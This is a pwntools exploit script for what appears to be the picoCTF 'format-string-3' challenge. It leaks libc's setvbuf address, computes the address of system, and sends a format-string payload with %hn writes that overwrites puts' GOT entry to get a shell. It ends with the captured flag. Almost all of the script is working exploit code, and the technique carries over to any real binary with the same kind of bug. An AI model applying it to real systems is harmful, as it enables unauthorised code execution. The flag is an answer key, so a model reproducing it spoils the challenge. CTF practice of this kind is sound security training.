#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host mimas.picoctf.net --port 64602 ./format-string-3
import sys
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./format-string-3')

#libc_path="/lib/x86_64-linux-gnu/libc.so.6"
libc_path="./libc.so.6"
    
if args.LIBC:
    os.environ['LD_PRELOAD'] = libc_path

libc = ELF(libc_path)
os.environ['LD_LIBRARY_PATH'] = '.'


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'rhea.picoctf.net'
port = int(args.PORT or 57356)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x3ff000)
# RUNPATH:  b'.'

io = start()
io.recvuntil('setvbuf in libc: 0x')
data = io.recvuntil('\n')[:-1]
print(f'leak_setvbuf: {data}, {len(data)}')
leak_setvbuf = int(data,16)
print(f'leak_setvbuf: {hex(leak_setvbuf)}')
libc.address = leak_setvbuf - libc.symbols['setvbuf']
print(f"LIBC BASE  : {hex(libc.address)}")
print(f"LIBC PUTS  : {hex(libc.symbols['puts'])}")
SYSTEM_ADDR=libc.symbols['system']
print(f"LIBC SYSTEM: {hex(SYSTEM_ADDR)}")
FIRST = (SYSTEM_ADDR >> 16) & 0xFFFF
SECOND = SYSTEM_ADDR & 0xFFFF
print(f"HIGH BYTES: {hex(FIRST)}")
print(f"LOW  BYTES: {hex(SECOND)}")
GOT_PUTS=0x404018

payload = b''
#for i in range(40, 45):
#    payload += f'%{i}$p|'.encode()
payload += f'%{FIRST}c'.encode()
payload += b'%42$hn'
payload += f'%{SECOND-FIRST}c'.encode()
payload += b'%43$hn'
payload = fit({0: payload}, length=32, filler=b'_')
payload += p64(GOT_PUTS+2)
payload += p64(GOT_PUTS)

if (SECOND-FIRST) < 0:
    print("ADDRESSES Won't work... try again...")
    sys.exit(1)
#
print(payload)
io.sendline(payload)
io.interactive()

#picoCTF{G07_G07?_f574d38f}